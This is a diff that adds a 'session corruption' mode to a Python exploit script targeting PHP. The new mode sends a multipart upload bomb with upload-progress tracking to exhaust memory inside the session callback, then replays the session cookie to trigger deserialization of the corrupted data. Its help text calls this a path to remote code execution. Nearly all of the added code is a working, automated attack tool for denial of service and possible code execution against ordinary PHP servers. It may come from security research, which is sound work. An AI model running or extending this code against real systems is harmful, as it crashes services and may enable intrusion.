@@ -608,6 +608,259 @@ def run_heapshape_attack(host, port, path, strategy, spray_count,
     return best_level, best_detail
 
 
+def build_upload_progress_bomb(boundary, sid, num_files=16000, fname_size=500):
+    """Build a multipart body with upload_progress tracking + file bomb.
+
+    PHP's session upload_progress feature (rfc1867.c) calls
+    php_session_rfc1867_callback() during multipart parsing.  This callback
+    allocates session data (ecalloc, add_assoc_string_ex, array_init) to
+    build the $_SESSION[upload_progress_*] array.
+
+    If OOM fires while the callback is mid-write, longjmp() abandons the
+    callback's stack frame.  The session data is then in a partially-
+    constructed state.  During php_request_shutdown(), the session module
+    serializes and saves this corrupted data to the session file.
+
+    A follow-up request calling session_start() will deserialize the
+    corrupted session file, potentially triggering:
+      - Uninitialized zval reads during deserialization
+      - Malformed serialized data causing unexpected object instantiation
+      - Type confusion if partially-written arrays are read as other types
+    """
+    parts = []
+
+    # Part 1: session ID via cookie is preferred but we also put it in POST
+    parts.append(
+        f"--{boundary}\r\n"
+        f'Content-Disposition: form-data; name="PHPSESSID"\r\n'
+        f"\r\n"
+        f"{sid}\r\n"
+    )
+
+    # Part 2: PHP_SESSION_UPLOAD_PROGRESS - this activates the callback
+    parts.append(
+        f"--{boundary}\r\n"
+        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n'
+        f"\r\n"
+        f"oom_exploit\r\n"
+    )
+
+    # Parts 3+: file uploads to exhaust memory
+    # The upload_progress callback fires for EACH file part, allocating
+    # session data each time.  By the time we hit file ~15000, the callback
+    # is deep in session data allocation when OOM fires.
+    for i in range(num_files):
+        fname = chr(65 + (i % 26)) * (fname_size - len(str(i))) + str(i)
+        parts.append(
+            f"--{boundary}\r\n"
+            f'Content-Disposition: form-data; name="f{i}"; filename="{fname}"\r\n'
+            f"Content-Type: application/octet-stream\r\n"
+            f"\r\n"
+            f"X\r\n"
+        )
+
+    parts.append(f"--{boundary}--\r\n")
+    return "".join(parts).encode("latin1")
+
+
+def send_upload_progress_oom(host, port, path, sid, num_files=16000,
+                              fname_size=500, timeout=60):
+    """Phase 1: Send OOM bomb with upload_progress tracking active."""
+    boundary = "UPROG_" + str(int(time.time()))
+    body = build_upload_progress_bomb(boundary, sid, num_files, fname_size)
+
+    req = (
+        f"POST {path} HTTP/1.1\r\n"
+        f"Host: {host}\r\n"
+        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
+        f"Content-Length: {len(body)}\r\n"
+        f"Cookie: PHPSESSID={sid}\r\n"
+        f"Connection: close\r\n\r\n"
+    ).encode() + body
+
+    s = socket.create_connection((host, port), timeout=timeout)
+    sent = 0
+    while sent < len(req):
+        chunk = req[sent:sent + 65536]
+        s.sendall(chunk)
+        sent += len(chunk)
+
+    s.settimeout(15)
+    resp = b""
+    while True:
+        try:
+            d = s.recv(65536)
+            if not d:
+                break
+            resp += d
+        except socket.timeout:
+            break
+    s.close()
+    return resp
+
+
+def check_session_corruption(host, port, path, sid, timeout=10):
+    """Phase 2: Read the session file written during OOM and check for
+    corruption indicators."""
+    req = (
+        f"GET {path} HTTP/1.1\r\n"
+        f"Host: {host}\r\n"
+        f"Cookie: PHPSESSID={sid}\r\n"
+        f"Connection: close\r\n\r\n"
+    ).encode()
+
+    s = socket.create_connection((host, port), timeout=timeout)
+    s.sendall(req)
+    s.settimeout(timeout)
+    resp = b""
+    while True:
+        try:
+            d = s.recv(65536)
+            if not d:
+                break
+            resp += d
+        except socket.timeout:
+            break
+    s.close()
+    return resp
+
+
+def run_session_corruption_attack(host, port, path, num_files=16000,
+                                   fname_size=500, attempts=5):
+    """Execute the 2-phase upload_progress session corruption attack.
+
+    Phase 1: Send file upload bomb WITH session upload_progress tracking.
+             OOM fires mid-callback, leaving corrupted session data.
+    Phase 2: Request the same session to trigger deserialization of
+             the corrupted data.  Check for crashes or anomalies.
+
+    Returns (level, detail) like run_heapshape_attack.
+    """
+    import uuid
+    sid_base = "oom" + uuid.uuid4().hex[:26]
+
+    print(f"[*] Session ID base: {sid_base}")
+    print(f"[*] Attack: upload_progress callback OOM -> session corruption")
+    print(f"[*] {num_files} file uploads x {fname_size}B filenames")
+    print()
+
+    best_level = "DETECTED"
+    best_detail = ""
+    level_rank = {"CONFIRMED": 4, "PROBABLE": 3, "POSSIBLE": 2, "DETECTED": 1}
+
+    for attempt in range(1, attempts + 1):
+        attempt_sid = f"{sid_base}{attempt}"
+
+        print(f"--- Attempt {attempt}/{attempts} (SID: {attempt_sid}) ---")
+
+        # Phase 1: OOM with upload_progress
+        print("[Phase 1] Sending OOM bomb with upload_progress active...")
+        resp = send_upload_progress_oom(
+            host, port, path, attempt_sid, num_files, fname_size)
+
+        oom_hit = False
+        if resp:
+            status_line = resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
+            body = resp.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in resp else b""
+            print(f"    Response: {status_line}")
+
+            if b"Fatal error" in body or b"Allowed memory size" in body:
+                oom_hit = True
+                if b"tried to allocate" in body:
+                    idx = body.find(b"tried to allocate")
+                    snippet = body[idx:idx + 50].decode("latin1", "replace")
+                    print(f"    [+] OOM hit: {snippet}")
+                else:
+                    print("    [+] OOM hit (fatal error in body)")
+            elif b"500" in status_line.encode():
+                oom_hit = True
+                print("    [+] OOM hit (500 status)")
+            else:
+                print("    [-] No OOM detected, skipping phase 2")
+                continue
+        else:
+            oom_hit = True
+            print("    [+] No response (worker may have crashed)")
+
+        time.sleep(0.5)
+
+        # Phase 2: read the corrupted session
+        print("[Phase 2] Reading corrupted session via session_start()...")
+        resp2 = check_session_corruption(host, port, path, attempt_sid)
+
+        if resp2:
+            status2 = resp2.split(b"\r\n", 1)[0].decode("latin1", "replace")
+            body2 = resp2.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in resp2 else b""
+            print(f"    Response: {status2}")
+
+            if b"500" in status2.encode():
+                level = "POSSIBLE"
+                detail = f"Session deserialization returned 500 (SID: {attempt_sid})"
+                print(f"    [+] 500 error on session read!")
+            elif b"Fatal error" in body2 or b"Warning" in body2:
+                level = "POSSIBLE"
+                # Extract the error type
+                for marker in [b"Fatal error", b"Warning", b"Notice"]:
+                    if marker in body2:
+                        idx = body2.find(marker)
+                        snippet = body2[idx:idx + 200].decode("latin1", "replace")
+                        print(f"    [+] PHP error: {snippet[:120]}")
+                        break
+                detail = f"PHP error on session deserialization (SID: {attempt_sid})"
+            elif b"200" in status2.encode():
+                level = "DETECTED"
+                detail = f"Session read OK (SID: {attempt_sid})"
+                print(f"    [-] Session read without error")
+            else:
+                level = "DETECTED"
+                detail = f"Unexpected: {status2}"
+                print(f"    [?] Unexpected response: {status2}")
+        else:
+            level = "PROBABLE"
+            detail = f"Worker crashed reading corrupted session (SID: {attempt_sid})"
+            print(f"    [+] No response -- worker crashed reading session!")
+
+        if level_rank.get(level, 0) > level_rank.get(best_level, 0):
+            best_level = level
+            best_detail = detail
+
+        if best_level in ("CONFIRMED", "PROBABLE"):
+            break
+
+        # Check if session file was actually created
+        print("[Check] Verifying session file exists in container...")
+        try:
+            check_s = socket.create_connection((host, port), timeout=5)
+            # Use a simple GET to check if the container is still responding
+            check_req = (
+                f"GET {path} HTTP/1.1\r\n"
+                f"Host: {host}\r\n"
+                f"Connection: close\r\n\r\n"
+            ).encode()
+            check_s.sendall(check_req)
+            check_s.settimeout(5)
+            check_resp = b""
+            while True:
+                try:
+                    d = check_s.recv(4096)
+                    if not d:
+                        break
+                    check_resp += d
+                except socket.timeout:
+                    break
+            check_s.close()
+            if check_resp and b"200" in check_resp.split(b"\r\n", 1)[0]:
+                print("    Worker is alive")
+            else:
+                print("    [!] Worker may be degraded")
+        except Exception as e:
+            print(f"    [!] Worker unreachable: {e}")
+
+        print()
+
+    return best_level, best_detail
+
+
 def send_oom_request(host, port, path, strategy="files", **kwargs):
     """Send the OOM-triggering multipart request."""
     boundary = "OOM_BOUNDARY_" + str(int(time.time()))
@@ -723,6 +976,13 @@ def main():
     # No-length strategy options
     ap.add_argument("--total-mb", type=int, default=128)
 
+    # Session corruption attack (2-phase: OOM + session deserialization)
+    ap.add_argument("--session-corrupt", action="store_true",
+                    help="OOM during upload_progress -> corrupted session -> "
+                         "crash on deserialization (2-phase RCE path)")
+    ap.add_argument("--session-attempts", type=int, default=5,
+                    help="Number of session corruption attempts")
+
     # Heap shaping options
     ap.add_argument("--enable-heapshape", action="store_true",
                     help="Enable heap shaping (spray + OOM + verify RCE)")
@@ -769,11 +1029,40 @@ def main():
         print("[!] Could not detect PHP version from X-Powered-By header")
     print()
 
-    if args.enable_heapshape:
+    if args.session_corrupt:
+        print("Mode: Session corruption (upload_progress OOM -> deserialization)")
+    elif args.enable_heapshape:
         print("Mode: Heap Shaping (spray + OOM + RCE verification)")
     else:
         print("Mode: OOM trigger verification")
     print()
+
+    # ---- Session corruption mode ----
+    if args.session_corrupt:
+        level, detail = run_session_corruption_attack(
+            args.host, args.port, args.path,
+            num_files=args.num_files,
+            fname_size=args.fname_size,
+            attempts=args.session_attempts,
+        )
+
+        print()
+        print("=" * 60)
+        print("RESULT")
+        print("=" * 60)
+        if level == "CONFIRMED":
+            print("[+] RCE CONFIRMED via session corruption")
+        elif level == "PROBABLE":
+            print("[+] Worker crashed reading corrupted session data")
+            print("    This confirms the OOM left exploitable state")
+        elif level == "POSSIBLE":
+            print("[~] Anomaly detected during session deserialization")
+            print("    Corrupted session data caused PHP errors")
+        else:
+            print("[-] Session read survived -- data was not corrupted enough")
+            print("    The session serializer may have written a valid snapshot")
+        print(f"    {detail}")
+        sys.exit(0 if level in ("CONFIRMED", "PROBABLE") else 1)
 
     # ---- Heap Shaping mode ----
     if args.enable_heapshape:
